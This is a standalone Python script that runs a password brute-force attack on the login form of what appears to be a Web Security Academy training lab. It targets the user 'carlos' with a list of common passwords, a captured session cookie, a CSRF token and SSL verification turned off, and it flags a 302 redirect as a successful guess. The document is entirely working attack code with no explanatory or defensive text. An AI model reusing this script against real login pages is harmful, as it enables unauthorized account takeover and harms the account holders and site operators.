#!/usr/bin/env python3
import requests
import urllib3
import re

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target URL
url = "https://0a3e00bd035e358780e035ab003600c7.web-security-academy.net/login"

# Headers
headers = {
    "Host": "0a3e00bd035e358780e035ab003600c7.web-security-academy.net",
    "Cookie": "session=tFH8S75hGkjKLGmRTpxhaTdIYEPXEMz5",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Not=A?Brand";v="24", "Chromium";v="140"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"macOS"',
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://0a3e00bd035e358780e035ab003600c7.web-security-academy.net",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://0a3e00bd035e358780e035ab003600c7.web-security-academy.net/login",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i"
}

# Wordlist
passwords = [
    "123123",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "1234567890",
    "michael",
    "x654321",
    "superman",
    "1qaz2wsx",
    "baseball",
    "7777777",
    "121212",
    "000000"
]

# CSRF token
csrf_token = "wCp5hyp8kfhh0KJFVep5P9T2vSWa3laU"
username = "carlos"

print(f"[*] Starting brute force attack on user: {username}")
print(f"[*] Testing {len(passwords)} passwords...\n")

for password in passwords:
    # Prepare POST data
    data = {
        "csrf": csrf_token,
        "username": username,
        "password": password
    }

    try:
        # Send request
        response = requests.post(url, headers=headers, data=data, verify=False, allow_redirects=False)

        # Check for successful login
        # Successful login typically results in a redirect (302) or different response
        if response.status_code == 302:
            print(f"[+] SUCCESS! Password found: {password}")
            print(f"[+] Status Code: {response.status_code}")
            print(f"[+] Location: {response.headers.get('Location', 'N/A')}")
            break
        elif "Invalid username or password" not in response.text and "Incorrect" not in response.text:
            # Check if we don't see the typical error message
            print(f"[?] Potential match: {password} (Status: {response.status_code}, Length: {len(response.text)})")
        else:
            print(f"[-] Failed: {password} (Status: {response.status_code})")

    except Exception as e:
        print(f"[!] Error testing password '{password}': {str(e)}")

print("\n[*] Brute force attack completed")